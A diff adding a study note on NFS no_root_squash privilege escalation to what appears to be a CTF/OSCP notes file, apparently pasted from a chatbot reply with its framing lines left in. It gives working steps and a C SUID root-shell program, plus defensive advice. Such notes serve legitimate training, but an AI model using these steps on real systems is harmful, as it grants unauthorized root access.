@@ -190,6 +190,96 @@ chmod +x /tmp/rootme.sh
 
 ---
 
+
+
+Here's your revised and concise **Obsidian-friendly note**, combining your detailed explanation with clean structure and markdown formatting, perfect for fast reference during CTFs or reviews:
+
+---
+
+## 🚀 NFS Privilege Escalation (no\_root\_squash)
+
+**Category:** Remote → Local Privesc
+**Vector:** Misconfigured NFS Share (`no_root_squash`)
+**Relevance:** CTFs, OSCP, real-world pentests (e.g. backup systems)
+
+---
+
+### 🧠 Concept
+
+Privilege escalation vectors are not limited to local enumeration. Shared services like **NFS**, **SSH**, or **Telnet** can offer root access remotely — especially when combined. For example:
+
+* Finding a root SSH private key and logging in as root.
+* Or mounting a misconfigured NFS share with root permissions.
+
+---
+
+### 📁 NFS Basics
+
+* NFS configuration is stored in: `/etc/exports`
+* Default behavior: **root is squashed** (mapped to `nfsnobody`)
+* If `no_root_squash` is set **and** the share is writable:
+
+  * Files created as root retain root privileges
+  * You can upload a **SUID-root binary**
+
+---
+
+### ⚙️ Exploitation Steps
+
+1. **Mount the NFS share** from attacker machine:
+
+   ```bash
+   sudo mount -t nfs -o rw 10.10.x.x:/exported/path /mnt/nfs
+   ```
+
+2. **Create a SUID binary** on the mounted share:
+
+   ```c
+   // nfs.c
+   #include <stdio.h>
+   #include <stdlib.h>
+   int main() {
+     setuid(0); setgid(0);
+     system("/bin/bash");
+     return 0;
+   }
+   ```
+
+3. **Compile & set SUID**:
+
+   ```bash
+   gcc nfs.c -o nfs
+   chmod +s nfs
+   ```
+
+4. **Switch to target system** and run:
+
+   ```bash
+   ./nfs
+   whoami  # should return root
+   ```
+
+---
+
+### 🛡️ Defense
+
+* Always use `root_squash` unless explicitly required.
+* Never export writable shares with `no_root_squash`.
+* Restrict NFS to trusted IP ranges and use firewall rules.
+
+---
+
+### 🧪 Notes
+
+* This works **because SUID bits are preserved** in `no_root_squash` shares.
+* The target executes your binary **as root**, since the file ownership is maintained.
+
+---
+
+Let me know if you want to add a code block for automatic detection or enumeration tools (e.g., `showmount`, `nmap`, etc).
+
+
+
 ### 📎 References
 
 - [GTFOBins – Cron](https://gtfobins.github.io/gtfobins/cron/)
